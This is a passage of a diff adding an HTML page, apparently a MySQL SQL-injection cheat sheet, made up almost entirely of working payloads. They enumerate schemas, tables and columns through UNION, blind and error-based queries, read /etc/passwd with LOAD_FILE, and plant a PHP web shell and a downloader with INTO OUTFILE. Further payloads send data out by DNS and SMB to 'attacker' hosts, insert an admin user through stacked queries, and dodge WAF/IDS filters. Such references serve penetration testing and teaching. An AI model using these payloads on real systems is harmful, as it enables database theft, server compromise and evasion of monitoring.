+						<td class="code">information_schema.schemata, mysql.db</td>
+					</tr>
+					<tr>
+						<td>Columns</td>
+						<td class="code">schema_name, db</td>
+					</tr>
+					<tr>
+						<td>Current DB</td>
+						<td class="code">database(), schema()</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">database()</b>;
+					</li>
+					<li class="code">
+						SELECT <b class="injection">schema_name</b> FROM <b class="injection">information_schema.schemata</b>;
+					</li>
+					<li class="code">
+						SELECT DISTINCT(<b class="injection">db</b>) FROM <b class="injection">mysql.db</b>;-- (Privileged)
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Server_Hostname">Server Hostname</h2>
+				<ul class="data">
+
+					<li>
+						@@HOSTNAME
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">@@hostname</b>;
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Server_MAC_Address">Server MAC Address</h2>
+				<p>
+					The Universally Unique Identifier is a 128-bit number where the last 12 digits are formed from the interfaces MAC address.
+				</p>
+				<ul class="data">
+					<li>
+						UUID()
+					</li>
+				</ul>
+				<br>
+				<i>Output:</i>
+				<ul class="data example">
+					<li class="code">
+						aaaaaaaa-bbbb-cccc-dddd-<b class="injection">eeeeeeeeeeee</b>;
+					</li>
+				</ul>
+				<p>
+					<i> Note:
+					</i></p><ul class="note"><i>
+						<li>
+							May return a 48-bit random string instead of the MAC address on some Operating Systems.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Tables_And_Columns">Tables and Columns</h2>
+				<h3 id="MySQL_Determining_Number_Of_Columns">Determining number of columns</h3>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Number_Of_Columns_GroupOrder_By" target="_blank" rel="noopener">Order/Group By</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Number_Of_Columns_Error_Based" target="_blank" rel="noopener">Error Based</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Number_Of_Columns_Error_Based2" target="_blank" rel="noopener">Error Based 2</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Number_Of_Columns_Error_Based3" target="_blank" rel="noopener">Error Based 3</a>
+						</li>
+					</ul>
+
+					<div id="MySQL_Number_Of_Columns_GroupOrder_By" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<ul class="data">
+							<code class="code">
+								GROUP/ORDER BY n+1;
+							</code>
+						</ul>
+						<p>
+							<i> Notes:
+							</i></p><ul class="note"><i>
+								<li>
+									Keep incrementing the number until you get a False response.
+								</li>
+								<li>
+									Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
+								</li>
+							</i></ul>
+						<p></p>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1' ORDER BY 1--+</td>
+									<td class="true">True</td>
+								</tr>
+								<tr>
+									<td class="code">1' ORDER BY 2--+</td>
+									<td class="false">True</td>
+								</tr>
+								<tr>
+									<td class="code">1' ORDER BY 3--+</td>
+									<td class="true">True </td>
+								</tr>
+								<tr>
+									<td class="code">1' ORDER BY 4--+</td>
+									<td class="false">False - Query is only using 3 columns</td>
+								</tr>
+								<tr>
+									<td class="code">-1' UNION SELECT 1,2,3--+</td>
+									<td class="true">True</td>
+								</tr>
+							</tbody></table>
+						</ul>
+					</div>
+
+					<div id="MySQL_Number_Of_Columns_Error_Based" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<ul class="data">
+							<code class="code">
+								GROUP/ORDER BY 1,2,3,4,5...
+							</code>
+						</ul>
+						<p>
+							<i> Note:
+							</i></p><ul class="note"><i>
+								<li>
+									Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.
+								</li>
+							</i></ul>
+						<p></p>
+						<br>
+						<i>Examples:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1' GROUP BY 1,2,3,4,5--+</td>
+									<td>Unknown column '4' in 'group statement' </td>
+								</tr>
+								<tr>
+									<td class="code">1' ORDER BY 1,2,3,4,5--+</td>
+									<td>Unknown column '4' in 'order clause' </td>
+								</tr>
+							</tbody></table>
+						</ul>
+					</div>
+
+					<div id="MySQL_Number_Of_Columns_Error_Based2" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<ul class="data">
+							<code class="code">
+								SELECT ... INTO var_list, var_list1, var_list2...
+							</code>
+						</ul>
+						<p>
+							<i> Notes:
+							</i></p><ul class="note"><i>
+								<li>
+									This method works if error showing is enabled.
+								</li>
+								<li>
+									It is useful for finding the number of columns when the injection point is after a LIMIT clause.
+								</li>
+							</i></ul>
+						<p></p>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT permission FROM Users WHERE id = {INJECTION POINT};
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">-1 UNION SELECT 1 INTO @,@,@</td>
+									<td>The used SELECT statements have a different number of columns</td>
+								</tr>
+								<tr>
+									<td class="code">-1 UNION SELECT 1 INTO @,@</td>
+									<td>The used SELECT statements have a different number of columns</td>
+								</tr>
+								<tr>
+									<td class="code">-1 UNION SELECT 1 INTO @</td>
+									<td>No error means query uses 1 column</td>
+								</tr>
+							</tbody></table>
+						</ul>
+						<i>Example 2:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT username, permission FROM Users limit 1,{INJECTION POINT};
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1 INTO @,@,@</td>
+									<td>The used SELECT statements have a different number of columns</td>
+								</tr>
+								<tr>
+									<td class="code">1 INTO @,@</td>
+									<td>No error means query uses 2 columns</td>
+								</tr>
+							</tbody></table>
+						</ul>
+					</div>
+
+					<div id="MySQL_Number_Of_Columns_Error_Based3" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<ul class="data">
+							<code class="code">
+								AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
+							</code>
+						</ul>
+						<p>
+							<i> Notes:
+							</i></p><ul class="note"><i>
+								<li>
+									This works if you know the table name you're after and error showing is enabled.
+								</li>
+								<li>
+									It will return the amount of columns in the table, not the query.
+								</li>
+							</i></ul>
+						<p></p>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT permission FROM Users WHERE id = {INJECTION POINT};
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1 AND (SELECT * FROM Users) = 1</td>
+									<td>Operand should contain 3 column(s)</td>
+								</tr>
+							</tbody></table>
+						</ul>
+					</div>
+				</div>
+
+				<h3 id="MySQL_Retrieving_Tables">Retrieving Tables</h3>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Tables_Union" target="_blank" rel="noopener">Union</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Tables_Blind" target="_blank" rel="noopener">Blind</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Tables_Error" target="_blank" rel="noopener">Error</a>
+						</li>
+					</ul>
+
+					<div id="MySQL_Retrieving_Tables_Union" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MySQL_Retrieving_Tables_Blind" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MySQL_Retrieving_Tables_Error" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))</td>
+							</tr>
+							<tr>
+								<td class="code">(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);</td>
+							</tr>
+							<tr>
+								<td class="code">AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name  FROM  information_schema.tables LIMIT 1)));-- Available in 5.1.5</td>
+							</tr>
+						</tbody></table>
+					</div>
+				</div>
+				<p class="note">
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							version=10 for MySQL 5
+						</li>
+					</i></ul>
+				<p></p>
+				<h3 id="MySQL_Retrieving_Columns">Retrieving Columns</h3>
+				<div class="tabs ui-tabs ui-widget ui-widget-content ui-corner-all">
+					<ul class="ui-tabs-nav ui-helper-reset ui-helper-clearfix ui-widget-header ui-corner-all">
+						<li class="ui-state-default ui-corner-top ui-tabs-selected ui-state-active">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Columns_Union" target="_blank" rel="noopener">Union</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Columns_Blind" target="_blank" rel="noopener">Blind</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Columns_Error" target="_blank" rel="noopener">Error</a>
+						</li>
+						<li class="ui-state-default ui-corner-top">
+							<a href="http://sh1yan.top/wiki_dict/sql_dict/SQL-Injection-Knowledge-Base.html#MySQL_Retrieving_Columns_PROCEDURE_ANALYSE" target="_blank" rel="noopener">PROCEDURE ANALYSE()</a>
+						</li>
+					</ul>
+
+					<div id="MySQL_Retrieving_Columns_Union" class="ui-tabs-panel ui-widget-content ui-corner-bottom">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MySQL_Retrieving_Columns_Blind" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns  &gt; 'A'</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MySQL_Retrieving_Columns_Error" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<table class="noborder">
+							<tbody><tr>
+								<td class="code">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))</td>
+							</tr>
+							<tr>
+								<td class="code">(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);</td>
+							</tr>
+							<tr>
+								<td class="code">AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name  FROM  information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5</td>
+							</tr>
+							<tr>
+								<td class="code">AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1</td>
+							</tr>
+							<tr>
+								<td class="code">AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)</td>
+							</tr>
+							<tr>
+								<td class="code">AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)</td>
+							</tr>
+						</tbody></table>
+					</div>
+
+					<div id="MySQL_Retrieving_Columns_PROCEDURE_ANALYSE" class="ui-tabs-panel ui-widget-content ui-corner-bottom ui-tabs-hide">
+						<ul class="data">
+							<code class="code">
+								PROCEDURE ANALYSE()
+							</code>
+						</ul>
+						<p>
+							<i> Note:
+							</i></p><ul class="note"><i>
+								<li>
+									It is necessary for the web app to display the one of the selected columns in the SQL query you are injecting to.
+								</li>
+							</i></ul>
+						<p></p>
+						<br>
+						<i>Example:</i>
+						<ul class="data example">
+							<p>
+								Given the query
+								<code>
+									SELECT username, permission FROM Users WHERE id = 1;
+								</code>
+							</p>
+							<table class="noborder">
+								<tbody><tr>
+									<td class="code">1 PROCEDURE ANALYSE()</td>
+									<td>Get the first column's name</td>
+								</tr>
+								<tr>
+									<td class="code">1 LIMIT 1,1 PROCEDURE ANALYSE()</td>
+									<td>Get the second column's name</td>
+								</tr>
+								<tr>
+									<td class="code">1 LIMIT 2,1 PROCEDURE ANALYSE()</td>
+									<td>Get the third column's name</td>
+								</tr>
+							</tbody></table>
+						</ul>
+					</div>
+				</div>
+				<h3 id="MySQL_Retrieving_Multiple_Tables_Columns">Retrieving Multiple Tables/Columns at once</h3>
+				<ul class="data">
+					<li class="code">
+						SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, <b class="injection">(SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] &gt;',table_name,' &gt; ',column_name))))x)</b>, 4--+';
+					</li>
+				</ul>
+				<br>
+				<i>Output:</i>
+				<ul class="data">
+					<pre>[ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME
+[ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME
+[ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION
+[ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN
+[ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME
+[ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME
+[ information_schema ] &gt;COLLATIONS &gt; ID
+[ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT
+[ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED
+						</pre>
+				</ul>
+				<br>
+				<ul class="data">
+					<li class="code">
+						SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns 
+					</li>
+				</ul>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT username FROM Users WHERE id = '-1' UNION SELECT <b class="injection">MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns</b>--+';
+					</li>
+				</ul>
+				<br>
+				<i>Output:</i>
+				<ul class="data">
+					<pre>Table: talk_revisions
+Column: revid
+
+Table: talk_revisions
+Column: userid
+
+Table: talk_revisions
+Column: user
+
+Table: talk_projects
+Column: priority
+					</pre>
+				</ul>
+
+				<h3 id="MySQL_Find_Tables_From_Columns">Find Tables from Column Name</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT table_name FROM information_schema.columns WHERE column_name = 'username';</td>
+						<td>Finds the table names for any columns named username.</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';</td>
+						<td>Finds the table names for any columns that contain the word user.</td>
+					</tr>
+				</tbody></table>
+
+				<h3 id="MySQL_Find_Columns_From_Tables">Find Columns from Table Name</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';</td>
+						<td>Finds the columns for the Users table.</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';</td>
+						<td>Finds the column names for any tables that contain the word user.</td>
+					</tr>
+				</tbody></table>
+
+				<h3 id="MySQL_Find_Current_Query">Find out current query</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT info FROM information_schema.processlist</td>
+						<td>Available starting from MySQL 5.1.7.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Avoiding_Quotations">Avoiding the use of quotations</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT * FROM Users WHERE username = 0x61646D696E</td>
+						<td>Hex encoding.</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)</td>
+						<td>CHAR() Function.</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_String_Concatenation">String Concatenation</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT 'a' 'd' 'mi' 'n';</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT CONCAT('a', 'd', 'm', 'i', 'n');</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');</td>
+					</tr>
+				</tbody></table>
+				<p>
+					<i> Notes:
+					</i></p><ul><i>
+						<li class="note">
+							<code>CONCAT()</code> will return NULL if any of its arguements is NULL. Instead use <code>CONCAT_WS()</code>.
+						</li>
+						<li class="note">
+							The first argument of <code>CONCAT_WS()</code> defines the separator for the rest of its arguments.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Conditional_Statements">Conditional Statements</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">CASE</td>
+					</tr>
+					<tr>
+						<td class="code">IF()</td>
+					</tr>
+					<tr>
+						<td class="code">IFNULL()</td>
+					</tr>
+					<tr>
+						<td class="code">NULLIF()</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">IF(</b>1=1, true, false<b class="injection">)</b>;
+					</li>
+					<li class="code">
+						SELECT <b class="injection">CASE WHEN</b> 1=1 <b class="injection">THEN</b> true <b class="injection">ELSE</b> false <b class="injection">END</b>;
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Timing">Timing</h2>
+				<table>
+					<tbody><tr>
+						<td class="code">SLEEP()</td>
+						<td>MySQL 5</td>
+					</tr>
+					<tr>
+						<td class="code">BENCHMARK()</td>
+						<td>MySQL 4/5</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						' - (IF(MID(version(),1,1) LIKE 5, <b class="injection">BENCHMARK(100000,SHA1('true'))</b>, false)) - '
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Privileges">Privileges</h2>
+				<h3 id="MySQL_File_Privileges">File Privileges</h3>
+				<p>
+					The following queries can help determine the FILE privileges for a given user.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT file_priv FROM mysql.user WHERE user = 'username';</td>
+						<td>Root privileges required</td>
+						<td>MySQL 4/5</td>
+					</tr>
+					<tr>
+						<td class="code">SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';</td>
+						<td>No privileges required</td>
+						<td>MySQL 5</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Reading_Files">Reading Files</h2>
+				<p>
+					Files can be read if the user has FILE privileges.
+				</p>
+				<ul class="data">
+					<li>
+						LOAD_FILE()
+					</li>
+				</ul>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT <b class="injection">LOAD_FILE(</b>'/etc/passwd'<b class="injection">)</b>;
+					</li>
+					<li class="code">
+						SELECT <b class="injection">LOAD_FILE(</b>0x2F6574632F706173737764<b class="injection">)</b>;
+					</li>
+				</ul>
+				<p>
+					<i> Notes:
+					</i></p><ul><i>
+						<li class="note">
+							File must be located on the server host.
+						</li>
+						<li class="note">
+							The basedirectory for LOAD_FILE() is
+							<code>
+								@@datadir
+							</code>
+							.
+						</li>
+						<li class="note">
+							The file must be readable by the MySQL user.
+						</li>
+						<li class="note">
+							The file size must be less than max_allowed_packet.
+						</li>
+						<li class="note">
+							The default size for
+							<code>
+								@@max_allowed_packet
+							</code>
+							is 1047552 bytes.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Writing_Files">Writing Files</h2>
+				<p>
+					Files can be created if the user has FILE privileges.
+				</p>
+				<ul class="data">
+					<li>
+						INTO OUTFILE/DUMPFILE
+					</li>
+				</ul>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li>
+						To write a PHP shell:
+					</li>
+					<li class="code">
+						SELECT '&lt;? system($_GET[\'c\']); ?&gt;' <b class="injection">INTO OUTFILE</b> '/var/www/shell.php';
+					</li>
+					<br>
+					<li>
+						and then access it at:
+					</li>
+					<li class="code">
+						http://localhost/shell.php?c=cat%20/etc/passwd
+					</li>
+				</ul>
+				<ul class="data example">
+					<li>
+						To write a downloader:
+					</li><li>
+						SELECT '&lt;? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?&gt;' <b class="injection">INTO OUTFILE</b> '/var/www/get.php'
+					</li>
+					<br>
+					<li>
+						and then access it at:
+					</li>
+					<li class="code">
+						http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt
+					</li>
+				</ul>
+				<p>
+					<i> Notes:
+					</i></p><ul><i>
+						<li class="note">
+							Files cannot be overwritten with
+							<code>
+								INTO OUTFILE
+							</code>
+							.
+						</li>
+						<li class="note">
+							<code>
+								INTO OUTFILE
+							</code>
+							must be the last statement in the query.
+						</li>
+						<li class="note">
+							There is no way to encode the pathname, so quotes are required.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_OOB_Channeling">Out Of Band Channeling</h2>
+				<h3 id="MySQL_DNS_Requests">DNS Requests</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">SELECT LOAD_FILE(CONCAT('\\\\foo.',(select MID(version(),1,1)),'.attacker.com\\'));</td>
+					</tr>
+				</tbody></table>
+
+				<h3 id="MySQL_SMB_Requests">SMB Requests</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">' OR 1=1 INTO OUTFILE '\\\\attacker\\SMBshare\\output.txt</td>
+					</tr>
+				</tbody></table>
+
+				<h2 id="MySQL_Stacked_Queries">Stacked Queries</h2>
+				<p>
+					Stacked queries are possible with MySQL depending on which driver is being used by the PHP application to communicate with the database.
+				</p>
+				<p>
+					The <code>
+						PDO_MYSQL</code>
+					driver supports stacked queries. The <code>
+						MySQLi</code>
+					(Improved Extension) driver also supports stacked queries through the <code>
+						multi_query()</code>
+					function.
+				</p>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT * FROM Users WHERE ID=1 AND 1=0<b class="injection">;</b> INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');
+					</li>
+					<li class="code">
+						SELECT * FROM Users WHERE ID=1 AND 1=0<b class="injection">;</b> SHOW COLUMNS FROM Users;
+					</li>
+				</ul>
+
+				<h2 id="MySQL_Specific_Code">MySQL-specific code</h2>
+				<p>
+					MySQL allows you to specify the version number after the exclamation mark. The syntax within the comment is only executed if the version is greater or equal to the specified version number.
+				</p>
+				<br>
+				<i>Examples:</i>
+				<ul class="data example">
+					<li class="code">
+						UNION SELECT <b class="injection">/*!50000</b> 5,null;%00<b class="injection">*//*!40000</b> 4,null-- ,<b class="injection">*//*!30000</b> 3,null-- x<b class="injection">*/</b>0,null--+
+					</li>
+					<li class="code">
+						SELECT 1<b class="injection">/*!41320</b>UNION<b class="injection">/*!/*!/*!00000</b>SELECT<b class="injection">/*!/*!</b>USER<b class="injection">/*!</b>(<b class="injection">/*!/*!/*!*/</b>);
+					</li>
+				</ul>
+				<p class="note">
+					<i> Notes:
+					</i></p><ul><i>
+						<li class="note">
+							The first example returns the version; it uses a UNION with 2 columns.
+						</li>
+						<li class="note">
+							The second example demonstrates how this can be useful for bypassing a WAF/IDS.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h2 id="MySQL_Fuzzing_Obfuscation">Fuzzing and Obfuscation</h2>
+				<h3 id="MySQL_Allowed_Intermediary_Chars">Allowed Intermediary Characters</h3>
+				<p>
+					The following characters can be used as whitespaces.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">09</td>
+						<td>Horizontal Tab</td>
+					</tr>
+					<tr>
+						<td class="code">0A</td>
+						<td>New Line</td>
+					</tr>
+					<tr>
+						<td class="code">0B</td>
+						<td>Vertical Tab</td>
+					</tr>
+					<tr>
+						<td class="code">0C</td>
+						<td>New Page</td>
+					</tr>
+					<tr>
+						<td class="code">0D</td>
+						<td>Carriage Return</td>
+					</tr>
+					<tr>
+						<td class="code">A0</td>
+						<td>Non-breaking Space</td>
+					</tr>
+					<tr>
+						<td class="code">20</td>
+						<td>Space</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						'<b class="injection">%0A%09</b>UNION<b class="injection">%0C</b>SELECT<b class="injection">%A0</b>NULL<b class="injection">%20</b>%23
+					</li>
+				</ul>
+				<br>
+
+				<p>
+					Parentheses can also be used to avoid the use of spaces.
+				</p>
+				<table>
+					<tbody><tr>
+						<td class="code">28</td>
+						<td>(</td>
+					</tr>
+					<tr>
+						<td class="code">29</td>
+						<td>)</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						UNION<b class="injection">(</b>SELECT<b class="injection">(</b>column<b class="injection">)</b>FROM<b class="injection">(</b>table<b class="injection">))</b>
+					</li>
+				</ul>
+
+				<h3 id="MySQL_Allowed_Intermediary_Chars_AND-OR">Allowed Intermediary Characters after AND/OR</h3>
+				<table>
+					<tbody><tr>
+						<td class="code">20</td>
+						<td>Space</td>
+					</tr>
+					<tr>
+						<td class="code">2B</td>
+						<td>+</td>
+					</tr>
+					<tr>
+						<td class="code">2D</td>
+						<td>-</td>
+					</tr>
+					<tr>
+						<td class="code">7E</td>
+						<td>~</td>
+					</tr>
+					<tr>
+						<td class="code">21</td>
+						<td>!</td>
+					</tr>
+					<tr>
+						<td class="code">40</td>
+						<td>@</td>
+					</tr>
+				</tbody></table>
+				<br>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						SELECT 1 FROM dual WHERE 1=1 AND<b class="injection">-+-+-+-+~~</b>((1))
+					</li>
+				</ul>
+				<p>
+					<i> Note:
+					</i></p><ul><i>
+						<li class="note">
+							<code>
+								dual
+							</code>
+							is a dummy table which can be used for testing.
+						</li>
+					</i></ul>
+				<p></p>
+
+				<h3 id="MySQL_Obfuscating_Comments">Obfuscating with Comments</h3>
+				<p>
+					Comments can be used to break up the query to trick the WAF/IDS and avoid detection. By using # or -- followed by a newline, we can split the query into separate lines.
+				</p>
+				<i>Example:</i>
+				<ul class="data example">
+					<li class="code">
+						1'<b class="injection">#</b>
+						<br>
+						AND 0<b class="injection">--</b>
+						<br>
+						UNION<b class="injection"># I am a comment!</b>
+						<br>
+						SELECT@tmp:=table_name x FROM<b class="injection">--</b>
+						<br>
+						`information_schema`.tables LIMIT 1<b class="injection">#</b>
+						<br>
+					</li>
+				</ul>
+				<p>
+					URL Encoded the injection would look like:
+				</p>
+				<ul class="data example">
+					<li class="code">
+						1'<b class="injection">%23%0A</b>AND 0<b class="injection">--%0A</b>UNION<b class="injection">%23 I am a comment!%0A</b>SELECT@tmp:=table_name x FROM<b class="injection">--%0A</b>`information_schema`.tables LIMIT 1<b class="injection">%23</b>
+					</li>
+				</ul>
+				<p>
